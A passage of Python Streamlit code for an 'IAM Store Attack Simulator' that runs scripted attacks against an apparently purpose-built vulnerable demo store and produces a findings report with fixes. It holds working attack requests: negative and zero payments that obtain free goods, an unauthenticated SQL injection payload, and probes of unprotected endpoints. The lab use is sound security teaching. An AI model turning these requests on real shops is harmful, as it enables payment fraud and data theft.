            evidence["negative_amount"] = amount_charged
            impact.append(f"Store credited ${abs(amount_charged)} to attacker")
        else:
            _log(log_container, entries, "info", f"HTTP {r2.status_code}: {r2.text[:80]}")
            findings.append(f"Negative payment returned HTTP {r2.status_code}")

        # Step 3: Submit zero payment on a new order
        _log(log_container, entries, "step", "Step 3: Attempting ZERO payment ($0.00)")
        _log(log_container, entries, "send", "POST /api/cart (product_id=2)")
        requests.post(f"{STORE_API}/api/cart", headers=_headers(token),
                      json={"product_id": 2, "quantity": 1}, timeout=5)
        r_ord = requests.post(f"{STORE_API}/api/orders", headers=_headers(token),
                              json={"shipping_address": "Free Stuff Rd"}, timeout=5)
        if r_ord.status_code == 200:
            oid2 = r_ord.json()["order_id"]
            _log(log_container, entries, "send", f'POST /api/payments/process {{"order_id":{oid2},"amount":0}}')
            r3 = requests.post(f"{STORE_API}/api/payments/process", headers=_headers(token),
                               json={"order_id": oid2, "amount": 0, "method": "credit_card"}, timeout=5)
            if r3.status_code == 200:
                zero_result = r3.json()
                _log(log_container, entries, "vuln", "ZERO PAYMENT ACCEPTED! Free items!")
                _log(log_container, entries, "info", f"  Transaction ID: {zero_result.get('transaction_id', '?')}")
                findings.append(f"Zero payment accepted for order #{oid2}")
                evidence["zero_txn_id"] = zero_result.get("transaction_id", "?")
                impact.append("Free items obtained via $0 payment")
            else:
                _log(log_container, entries, "info", f"Zero payment: HTTP {r3.status_code}")
        else:
            _log(log_container, entries, "info", "Could not create second order for zero-payment test")

        _log(log_container, entries, "success", "Negative Payment complete - no amount validation on server")
        return _result("Negative Payment", "CRITICAL", len(findings) > 0, findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("Negative Payment", "CRITICAL", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("Negative Payment", "CRITICAL", False, [f"Error: {str(e)}"], {}, [])


def attack_no_auth(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting Missing Auth Check attack")

        # Step 1: Access products without auth
        _log(log_container, entries, "step", "Step 1: Accessing products without any token")
        _log(log_container, entries, "send", "GET /api/products (no Authorization header)")
        r = requests.get(f"{STORE_API}/api/products", timeout=5)
        if r.status_code == 200:
            products = r.json()
            _log(log_container, entries, "vuln", f"NO AUTH REQUIRED! Got {len(products)} products")
            for p in products[:3]:
                _log(log_container, entries, "info", f"  {p.get('name', '?')} - ${p.get('price', '?')} (stock: {p.get('stock', '?')})")
            findings.append(f"Products endpoint returned {len(products)} products without auth")
            evidence["products_exposed"] = len(products)
            impact.append(f"{len(products)} products exposed without authentication")
        else:
            _log(log_container, entries, "info", f"HTTP {r.status_code}")

        # Step 2: SQL injection without auth
        _log(log_container, entries, "step", "Step 2: SQL injection WITHOUT any authentication")
        _log(log_container, entries, "send", "GET /api/products?search=' OR 1=1-- (no token)")
        r2 = requests.get(f"{STORE_API}/api/products", params={"search": "' OR 1=1--"}, timeout=5)
        if r2.status_code == 200:
            data = r2.json()
            if isinstance(data, list) and len(data) > 5:
                _log(log_container, entries, "vuln", f"UNAUTHENTICATED SQL INJECTION! Dumped {len(data)} records")
                findings.append(f"SQL injection works without auth: {len(data)} records dumped")
                evidence["sqli_no_auth_count"] = len(data)
                impact.append("SQL injection possible without any authentication")
            else:
                _log(log_container, entries, "info", f"Returned {len(data)} results")

        # Step 3: Access categories without auth
        _log(log_container, entries, "step", "Step 3: Accessing categories without auth")
        _log(log_container, entries, "send", "GET /api/products/categories (no token)")
        r3 = requests.get(f"{STORE_API}/api/products/categories", timeout=5)
        if r3.status_code == 200:
            cats = r3.json()
            _log(log_container, entries, "vuln", f"Categories exposed without auth: {len(cats)} categories")
            findings.append(f"Categories endpoint exposed {len(cats)} categories")
            evidence["categories_exposed"] = len(cats)

        # Step 4: Access API docs
        _log(log_container, entries, "step", "Step 4: Accessing API documentation")
        _log(log_container, entries, "send", "GET /docs (no token)")
        r4 = requests.get(f"{STORE_API}/docs", timeout=5)
        if r4.status_code == 200:
            _log(log_container, entries, "vuln", "API docs (Swagger UI) publicly accessible - full endpoint enumeration!")
            findings.append("Swagger UI (/docs) accessible without auth")
            evidence["docs_exposed"] = True
            impact.append("Full API documentation exposed for attack planning")

        # Step 5: Health endpoint
        _log(log_container, entries, "step", "Step 5: Accessing system health endpoint")
        _log(log_container, entries, "send", "GET /store/health (no token)")
        r5 = requests.get(f"{STORE_API}/store/health", timeout=5)
        if r5.status_code == 200:
            health = r5.json()
            _log(log_container, entries, "vuln", f"Health endpoint exposed: {json.dumps(health)}")
            findings.append(f"Health endpoint exposes system info")
            evidence["health_data"] = health

        _log(log_container, entries, "success", "Missing Auth attack complete - multiple endpoints unprotected")
        return _result("Missing Auth Check", "MEDIUM", len(findings) > 0, findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("Missing Auth Check", "MEDIUM", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("Missing Auth Check", "MEDIUM", False, [f"Error: {str(e)}"], {}, [])


ATTACK_FUNCTIONS = {
    "sql_injection": attack_sql_injection,
    "jwt_forgery": attack_jwt_forgery,
    "privilege_escalation": attack_privilege_escalation,
    "idor_orders": attack_idor_orders,
    "idor_cart": attack_idor_cart,
    "price_tampering": attack_price_tampering,
    "negative_payment": attack_negative_payment,
    "no_auth_access": attack_no_auth,
}


def _generate_report_markdown(results):
    """Generate a downloadable markdown report from attack results."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    total = len(results)
    vuln_count = sum(1 for r in results if r["success"])
    secure_count = total - vuln_count

    severity_counts = {}
    for r in results:
        if r["success"]:
            sev = r["severity"]
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

    lines = []
    lines.append("# IAM Store Security Assessment Report")
    lines.append(f"**Generated:** {now}")
    lines.append(f"**Target:** {STORE_API}")
    lines.append("")
    lines.append("---")
    lines.append("")
    lines.append("## Executive Summary")
    lines.append("")
    lines.append(f"**{vuln_count}/{total}** vulnerabilities confirmed out of {total} attacks tested.")
    lines.append("")
    if severity_counts:
        lines.append("### Severity Breakdown")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            if sev in severity_counts:
                lines.append(f"- **{sev}**: {severity_counts[sev]} finding(s)")
    lines.append("")
    lines.append("---")
    lines.append("")
    lines.append("## Detailed Findings")
    lines.append("")
    for i, r in enumerate(results, 1):
        status = "VULNERABLE" if r["success"] else "SECURE"
        lines.append(f"### {i}. {r['name']} [{r['severity']}] - {status}")
        lines.append("")
        if r["findings"]:
            lines.append("**Findings:**")
            for f in r["findings"]:
                lines.append(f"- {f}")
        lines.append("")
        if r["impact"]:
            lines.append("**Impact:**")
            for imp in r["impact"]:
                lines.append(f"- {imp}")
        lines.append("")
        if r["evidence"]:
            lines.append("**Evidence:**")
            lines.append(f"```json\n{json.dumps(r['evidence'], indent=2, default=str)}\n```")
        lines.append("")
        lines.append("---")
        lines.append("")

    lines.append("## Store Impact Summary")
    lines.append("")
    lines.append("The following changes were made to the store during testing:")
    lines.append("")
    all_impacts = []
    for r in results:
        all_impacts.extend(r.get("impact", []))
    if all_impacts:
        for imp in all_impacts:
            lines.append(f"- {imp}")
    else:
        lines.append("- No confirmed impacts (store may not have been reachable)")
    lines.append("")

    lines.append("## Recommendations")
    lines.append("")
    recommendations = {
        "SQL Injection": "Use parameterized queries / ORM methods instead of string concatenation. Validate and sanitize all user input.",
        "JWT Token Forgery": "Use a strong, unique secret key (256+ bit). Rotate secrets regularly. Consider asymmetric signing (RS256).",
        "Privilege Escalation": "Validate JWT claims against the IAM system. Do not trust role claims in tokens without server-side verification.",
        "IDOR - Order Access": "Verify that the authenticated user owns the resource before allowing read/write access.",
        "IDOR - Cart Manipulation": "Scope cart item operations to the authenticated user's session. Verify ownership on every mutation.",
        "Price Tampering": "Calculate order totals server-side. Never trust client-submitted payment amounts. Validate amount >= order total.",
        "Negative Payment": "Reject payment amounts <= 0. Validate that payment amount matches or exceeds the order total.",
        "Missing Auth Check": "Require authentication on all API endpoints. Disable Swagger UI in production. Use API gateway for auth enforcement.",
    }
    for r in results:
        if r["success"] and r["name"] in recommendations:
            lines.append(f"### {r['name']}")
            lines.append(f"- {recommendations[r['name']]}")
            lines.append("")

    lines.append("---")
    lines.append(f"*Report generated by IAM Store Attack Simulator on {now}*")

    return "\n".join(lines)


def _render_report(results):
    """Render the attack report in Streamlit."""
    total = len(results)
    vuln_count = sum(1 for r in results if r["success"])

    severity_counts = {}
    for r in results:
        if r["success"]:
            sev = r["severity"]
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

    # Summary
    st.markdown("### Attack Report")
    st.markdown(f"""<div style="padding:1rem; background:rgba(239,68,68,0.1); border-radius:10px;
        border:1px solid rgba(239,68,68,0.3); margin-bottom:1rem;">
        <h3 style="margin:0 0 0.5rem 0; color:#ff4444;">Summary: {vuln_count}/{total} Vulnerabilities Confirmed</h3>
        <div style="display:flex; gap:1rem; flex-wrap:wrap;">""" +
        "".join(f'<span style="background:{SEVERITY_COLORS.get(sev, "#888")}22; color:{SEVERITY_COLORS.get(sev, "#888")}; '
                f'padding:4px 12px; border-radius:6px; font-weight:700; font-size:0.85rem;">'
                f'{sev}: {cnt}</span>' for sev, cnt in sorted(severity_counts.items(), key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW"].index(x[0]) if x[0] in ["CRITICAL","HIGH","MEDIUM","LOW"] else 99)) +
        """</div>
    </div>""", unsafe_allow_html=True)

    # Findings table
    table_html = """<table style="width:100%; border-collapse:collapse; font-size:0.82rem; font-family:'JetBrains Mono',monospace;">
        <tr style="border-bottom:2px solid rgba(255,255,255,0.1);">
            <th style="padding:8px; text-align:left; color:#94a3b8;">Attack</th>
            <th style="padding:8px; text-align:center; color:#94a3b8;">Severity</th>
            <th style="padding:8px; text-align:center; color:#94a3b8;">Status</th>
            <th style="padding:8px; text-align:left; color:#94a3b8;">Key Finding</th>
        </tr>"""
    for r in results:
        sev_color = SEVERITY_COLORS.get(r["severity"], "#888")
        if r["success"]:
            status_html = '<span style="color:#ff4444; font-weight:700;">VULNERABLE</span>'
        else:
            status_html = '<span style="color:#22c55e; font-weight:700;">SECURE</span>'
        finding_text = r["findings"][0] if r["findings"] else "No findings"
        if len(finding_text) > 80:
            finding_text = finding_text[:80] + "..."
        table_html += f"""<tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
            <td style="padding:8px; color:#e2e8f0;">{r['name']}</td>
            <td style="padding:8px; text-align:center;"><span style="color:{sev_color}; font-weight:700;
                background:{sev_color}22; padding:2px 8px; border-radius:4px;">{r['severity']}</span></td>
            <td style="padding:8px; text-align:center;">{status_html}</td>
            <td style="padding:8px; color:#94a3b8; font-size:0.75rem;">{finding_text}</td>
        </tr>"""
    table_html += "</table>"
    st.markdown(table_html, unsafe_allow_html=True)

    # Store Impact section
    all_impacts = []
    for r in results:
        for imp in r.get("impact", []):
            all_impacts.append((r["name"], imp))

    if all_impacts:
        st.markdown("#### Store Impact")
        impact_html = '<div style="padding:0.8rem; background:rgba(239,68,68,0.08); border-radius:8px; border-left:3px solid #ff4444;">'
        impact_html += '<div style="color:#ff4444; font-weight:700; margin-bottom:0.5rem;">Changes made to the store during testing:</div>'
        for attack_name, imp in all_impacts:
            impact_html += f'<div style="padding:2px 0; color:#e2e8f0; font-size:0.8rem;"><span style="color:#94a3b8;">[{attack_name}]</span> {imp}</div>'
        impact_html += '</div>'
        st.markdown(impact_html, unsafe_allow_html=True)

    # Recommendations
    st.markdown("#### Recommendations")
    recommendations = {
        "SQL Injection": "Use parameterized queries / ORM methods. Validate and sanitize all user input.",
        "JWT Token Forgery": "Use a strong, unique secret key (256+ bit). Rotate secrets. Consider RS256.",
        "Privilege Escalation": "Validate JWT role claims against IAM. Do not trust self-asserted roles.",
        "IDOR - Order Access": "Verify resource ownership before allowing access. Check user_id matches.",
        "IDOR - Cart Manipulation": "Scope cart operations to authenticated user. Verify ownership on mutations.",
        "Price Tampering": "Calculate totals server-side. Validate payment amount >= order total.",
        "Negative Payment": "Reject amounts <= 0. Validate payment matches order total.",
        "Missing Auth Check": "Require auth on all endpoints. Disable Swagger in production.",
    }
    for r in results:
        if r["success"] and r["name"] in recommendations:
            st.markdown(f"""<div style="padding:0.4rem 0.8rem; margin:0.2rem 0; border-radius:6px;
                background:rgba(99,102,241,0.08); border-left:3px solid #818cf8; font-size:0.8rem;">
                <span style="color:#818cf8; font-weight:600;">{r['name']}:</span>
                <span style="color:#e2e8f0;"> {recommendations[r['name']]}</span>
            </div>""", unsafe_allow_html=True)

    # Download button
    st.markdown("")
    report_md = _generate_report_markdown(results)
    st.download_button(
        label="\U0001f4e5 Download Full Report (Markdown)",
        data=report_md,
        file_name=f"iam_store_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md",
        mime="text/markdown",
        use_container_width=True,
    )


def show_store_attack_simulator():
    """Main page for the Store Attack Simulator."""
    st.markdown("""<div class="page-header">
        <h1 style="font-size:1.75rem !important; margin-bottom:0.25rem; font-weight:800;">
            \U0001f5e1 <span style="color:var(--accent) !important;">Store Attack Simulator</span>
        </h1>
        <p style="color:var(--text-muted) !important; font-size:0.88rem;">
            Live attack demonstrations against IAM Store vulnerabilities
        </p>
    </div>""", unsafe_allow_html=True)

    # Check store connectivity
    try:
        r = requests.get(f"{STORE_API}/store/health", timeout=3)
        store_ok = r.status_code == 200
    except Exception:
        store_ok = False

    if not store_ok:
        st.error(f"IAM Store is not reachable at {STORE_API}. Start the store first (start.bat in IAM-Store folder).")
        return

    st.markdown(f'<div style="padding:0.5rem 1rem; background:rgba(34,197,94,0.1); border-radius:8px; border-left:3px solid #22c55e; margin-bottom:1rem;">'
                f'<span style="color:#22c55e; font-weight:600;">Store Online</span> '
                f'<span style="color:var(--text-muted);">| Target: {STORE_API}</span></div>', unsafe_allow_html=True)

    # Initialize session state
    if "selected_attack" not in st.session_state:
        st.session_state.selected_attack = None
    if "attack_running" not in st.session_state:
        st.session_state.attack_running = False
    if "attack_results" not in st.session_state:
        st.session_state.attack_results = []

    # Attack selection
    col1, col2 = st.columns([1, 2])

    with col1:
        st.markdown("### Select Attack")

        for attack_id, info in ATTACKS.items():
            sev_color = SEVERITY_COLORS.get(info["severity"], "#888")
            is_selected = st.session_state.selected_attack == attack_id
            bg = "rgba(99,102,241,0.15)" if is_selected else "transparent"
            border = "2px solid var(--accent-solid)" if is_selected else "1px solid rgba(255,255,255,0.06)"

            st.markdown(f"""<div style="padding:0.6rem; margin:0.3rem 0; border-radius:8px;
                background:{bg}; border:{border}; cursor:pointer;">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span style="font-weight:600; color:var(--text-primary);">{info['icon']} {info['name']}</span>
                    <span style="font-size:0.65rem; font-weight:700; color:{sev_color};
                        background:{sev_color}22; padding:2px 6px; border-radius:4px;">{info['severity']}</span>
                </div>
            </div>""", unsafe_allow_html=True)

            if st.button(f"Select", key=f"sel_{attack_id}", use_container_width=True):
                st.session_state.selected_attack = attack_id
                st.session_state.attack_running = False
                st.rerun()

    with col2:
        if st.session_state.selected_attack:
            attack_id = st.session_state.selected_attack
            info = ATTACKS[attack_id]
            sev_color = SEVERITY_COLORS.get(info["severity"], "#888")

            st.markdown(f"""<div style="padding:1rem; background:rgba(15,15,35,0.5); border-radius:10px;
                border:1px solid rgba(255,255,255,0.08); margin-bottom:1rem;">
                <h3 style="margin:0 0 0.3rem 0; color:var(--text-primary);">{info['icon']} {info['name']}</h3>
                <p style="color:var(--text-muted); margin:0 0 0.5rem 0; font-size:0.85rem;">{info['description']}</p>
                <div style="display:flex; gap:1rem; font-size:0.75rem;">
                    <span style="color:{sev_color}; font-weight:700;">Severity: {info['severity']}</span>
                    <span style="color:var(--text-muted);">Target: <code>{info['target']}</code></span>
                </div>
            </div>""", unsafe_allow_html=True)

            # Run button
            if st.button(f"\u25b6 Launch Attack: {info['name']}", type="primary", use_container_width=True, key="run_attack"):
                st.session_state.attack_running = True

            # Attack log area
            st.markdown("#### Attack Log")
            log_container = st.empty()

            if st.session_state.attack_running:
                attack_fn = ATTACK_FUNCTIONS.get(attack_id)
                if attack_fn:
                    try:
                        result = attack_fn(log_container)
                        if result:
                            # Update or add result
                            existing_names = [r["name"] for r in st.session_state.attack_results]
                            if result["name"] in existing_names:
                                idx = existing_names.index(result["name"])
                                st.session_state.attack_results[idx] = result
                            else:
                                st.session_state.attack_results.append(result)
                    except requests.ConnectionError:
                        st.error(f"Connection failed to {STORE_API}. Is the store running?")
                    except Exception as e:
                        st.error(f"Attack error: {e}")
                    st.session_state.attack_running = False
        else:
            st.markdown("""<div style="padding:3rem; text-align:center; color:var(--text-muted);">
                <div style="font-size:3rem; margin-bottom:0.5rem;">\U0001f3af</div>
                <p>Select an attack from the left panel to begin</p>
                <p style="font-size:0.8rem;">Each attack shows step-by-step what happens,<br>
                including requests sent, responses received, and vulnerabilities found.</p>
            </div>""", unsafe_allow_html=True)

    # Run All button
    st.markdown("---")
    if st.button("\U0001f680 Run All Attacks", use_container_width=True, key="run_all"):
        st.session_state.attack_results = []
        st.markdown("### Full Attack Suite")
        for attack_id, info in ATTACKS.items():
            with st.expander(f"{info['icon']} {info['name']} ({info['severity']})", expanded=True):
                log_c = st.empty()
                attack_fn = ATTACK_FUNCTIONS.get(attack_id)
                if attack_fn:
                    try:
                        result = attack_fn(log_c)
                        if result:
                            st.session_state.attack_results.append(result)
                    except Exception as e:
                        st.error(f"Error: {e}")
                        st.session_state.attack_results.append(
                            _result(info["name"], info["severity"], False, [f"Error: {str(e)}"], {}, [])
                        )

    # Report section
    if st.session_state.attack_results:
        st.markdown("---")
        _render_report(st.session_state.attack_results)
